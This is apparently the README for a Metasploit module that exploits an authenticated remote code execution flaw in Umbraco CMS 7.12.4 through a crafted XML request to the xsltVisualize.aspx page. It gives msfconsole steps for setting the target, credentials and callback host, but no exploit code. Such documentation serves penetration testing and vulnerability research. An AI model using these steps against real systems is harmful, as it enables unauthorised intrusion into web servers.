# umbraco_xslt_cs_auth_exec

A vulnerability is present in Umbraco CMS version 7.12.4, which allows, once logged in with administrator rights, to operate a remote code execution.

Remote code execution is possible by forging a crafted XML request in the `developer/Xslt/xsltVisualize.aspx` page.

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/windows/http/umbraco_xslt_cs_auth_exec`
4. Do: `set RHOSTS [REDACTED]`
5. Do: `set USERNAME [REDACTED]`
6. Do: `set PASSWORD [REDACTED]`
7. Do: `set LHOST [REDACTED]`
8. Do: `run`

![alt text][module_options]

## Targeting

### Windows

![alt text][module_run]

[module_options]: https://github.com/mekhalleh/umbraco_xslt_cs_auth_exec/raw/master/pictures/module_options.png "Module: options"
[module_run]: https://github.com/mekhalleh/umbraco_xslt_cs_auth_exec/raw/master/pictures/module_run.png "Module: run"
